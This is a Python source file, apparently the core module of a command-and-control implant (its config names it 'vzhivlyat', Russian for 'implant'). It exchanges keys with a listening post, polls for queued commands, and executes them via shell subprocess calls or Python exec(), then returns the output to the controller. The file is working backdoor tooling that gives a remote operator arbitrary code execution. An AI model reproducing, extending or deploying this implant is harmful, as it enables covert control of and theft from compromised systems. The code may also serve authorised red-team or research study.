# ядро - core
import ast

from copy import copy
from time import time, sleep

from lib import instructions
from lib import transmit
from lib.crypto import asymmetric


def _get_cmd_index(component, cmd_txid, type):
    if type == "cmd":
        cmd_index = next(
            (index for (index, d) in enumerate(component.cmd_queue) if d["txid"] == cmd_txid),
            None)
    elif type == "processing":
        cmd_index = next(
            (index for (index, d) in enumerate(component.cmd_processing_queue) if d["txid"] == cmd_txid),
            None)
    else:
        cmd_index = next(
            (index for (index, d) in enumerate(component.cmd_done_queue) if d["txid"] == cmd_txid),
            None)
    return cmd_index


def init(frame, component):
    """
    Initialization frame received, sending self manifest

    :param frame: Initialization frame
    :param component:
    :return:
    """
    try:
        component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['lpk']))
        component.logging.log(f"Initialization complete", source="lib.yadro")
    except Exception as e:
        component.logging.log(f"Failed to get init. Encountered [{type(e).__name__}]: {e}",
                              level="critical", source="lib.yadro")
    return 0


def rekey(frame, component):
    """
    Rekey request received

    :param frame:
    :param component:
    :return:
    """
    # TODO: Key rotation
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key
    data = init(frame, component)

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(component, instruction_frame)
    return reply_frame


def getcmd(frame, component):
    # TODO: Key rotation
    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key
    commands = frame['args'][0]
    cmd_txids = []
    for command in commands:
        command['state'] = "RECEIVED"
        event_history = {"timestamp": time(), "event": "RECEIVED", "component": component.component_id}
        command['history'].append(event_history)
        cmd_txids.append(command['txid'])
        component.cmd_queue.append(command)

    return 0


def send_cmd_output(component):
    done_commands = []
    for command in component.cmd_done_queue:
        cmd_index = _get_cmd_index(component, command['txid'], "done")
        command['state'] = "RETURNING"
        event_history = {"timestamp": time(), "event": "RETURNING", "component": component.component_id}
        command['history'].append(event_history)
        done_commands.append(copy(command))
    data = {'component_id': component.component_id, "cmd": "fcmd", "args": [done_commands, {"ipk": component.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    request_frame = transmit.cook_transmit_frame(component, instruction_frame)
    component.transport.send_data(request_frame)
    del done_commands
    del command
    sleep(5)
    reply = component.transport.recv_data()
    uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
    return uncooked_frame


def import_transport_for_implant(component, transport_config):
    transport_name = component.config['vzhivlyat']['transport_name']
    import_string = f"import transports.{transport_name} as transport"
    transport_config['logging'] = component.logging
    exec(import_string, globals())
    try:
        # I know this is fucking weird, but you find a better way to do this then
        implant_transport = transport.Transport()
        component.transport = implant_transport
        component.logging.log(f"Imported {transport_name}",
                              level="debug", source="lib.yadro")
        component.transport.prep_transport(transport_config)
        return component.transport
    except ImportError:
        component.logging.log(f"{transport_name} not found!, attempted import",
                              level="error", source="lib.yadro")


def generate_init_frame(component):
    data = {'component_id': component.component_id, "cmd": "ii", "args": [{"manifest": component.manifest}, {"ipk": component.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_sealed_frame(component, instruction_frame)
    return reply_frame


def relay_reply(component, reply):
    try:
        reply_frame = transmit.cook_transmit_frame(component, reply)
        component.transport.send_data(reply_frame)
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when relaying: {e}",
                              level="critical", source=f"lib.yadro")


def retrieve_output(component):
    try:
        reply_frame = component.transport.recv_data()
        # TODO: Rotate implant private key here
        return reply_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when retrieving data: {e}",
                              level="critical", source=f"lib.yadro")
        return None


def relay_init_frame(component, reply):
    try:
        component.transport.send_data(reply)
        sleep(5)
        init_response = component.transport.recv_data()
        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, init_response).decode('utf-8'))
        return uncooked_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when relaying init: {e}",
                              level="critical", source=f"lib.yadro")


def request_instructions(component):
    try:
        data = {'component_id': component.component_id, "cmd": "icmdr", "args": [{"ipk": component.current_public_key._public_key}]}
        instruction_frame = instructions.create_instruction_frame(data)
        request_frame = transmit.cook_transmit_frame(component, instruction_frame)
        component.transport.send_data(request_frame)
        sleep(5)
        reply = component.transport.recv_data()
        if reply is None:
            pass
        uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
        return uncooked_frame
    except Exception as e:
        component.logging.log(f"Critical [{type(e).__name__}] when requesting instructions: {e}",
                              level="critical", source=f"lib.yadro")


def process_commands(component):
    component.logging.log(f"Preparing commands for execution", level="debug")
    for command in component.cmd_queue:
        if command['state'] == "RECEIVED":
            # Move it from the cmd_queue to cmd_processing_queue
            cmd_index = _get_cmd_index(component, command['txid'], "cmd")
            command['state'] = "PROCESSING"
            event_history = {"timestamp": time(), "event": "EXECUTING", "component": component.component_id}
            command['history'].append(event_history)
            component.cmd_processing_queue.append(command)
            component.cmd_queue.pop(cmd_index)


def ack_cmds(frame, component):
    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
    component.current_private_key = component.initial_private_key
    component.current_public_key = component.initial_public_key
    command_txids = frame['args'][0]
    for command_txid in command_txids:
        cmd_index = _get_cmd_index(component, command_txid, "done")
        del component.cmd_done_queue[cmd_index]
    return 0


def execute_instruction(instruction):
    if instruction['cmd'] == "shell_exec":
        import subprocess
        try:
            instruction['output'] = subprocess.check_output(instruction['args'][0]['cmd_arg'], shell=True).decode('utf-8')
        except Exception as e:
            instruction['output'] = f"ERROR: {e}"
    elif instruction['cmd'] == "raw_exec":
        import subprocess
        try:
            instruction['output'] = subprocess.check_output(instruction['args'][0]['cmd_arg'], shell=False).decode('utf-8')
        except Exception as e:
            instruction['output'] = f"ERROR: {e}"
    elif instruction['cmd'] == "pyexec":
        try:
            instruction['output'] = exec(instruction['args'][0]['cmd_arg'])
        except Exception as e:
            instruction['output'] = f"ERROR: {e}"
    else:
        instruction['output'] = f"ERROR: Instruction {instruction['cmd']} not supported"
    return instruction


def run_instructions(component):
    for command in component.cmd_processing_queue:
        try:
            cmd_index = _get_cmd_index(component, command['txid'], "processing")
            command = execute_instruction(command)
            command['state'] = "EXECUTED"
            event_history = {"timestamp": time(), "event": "EXECUTED", "component": component.component_id}
            command['history'].append(event_history)
            component.logging.log(f"Executed {command['txid']}", level="info", source="lib.yadro")
            component.logging.log(f"Executed {command}", level="debug", source="lib.yadro")
            command['state'] = "FINISHED"
            event_history = {"timestamp": time(), "event": "FINISHED", "component": component.component_id}
            command['history'].append(event_history)
            component.cmd_done_queue.append(copy(command))
            del(component.cmd_processing_queue[cmd_index])
            # TODO: FIXME
            # TODO: Actually execute the command here and retrieve the output, see #2, add state of "FINISHED"
        except Exception as e:
            component.logging.log(f"Critical [{type(e).__name__}] when requesting command: {e}",
                                  level="critical", source=f"lib.yadro")
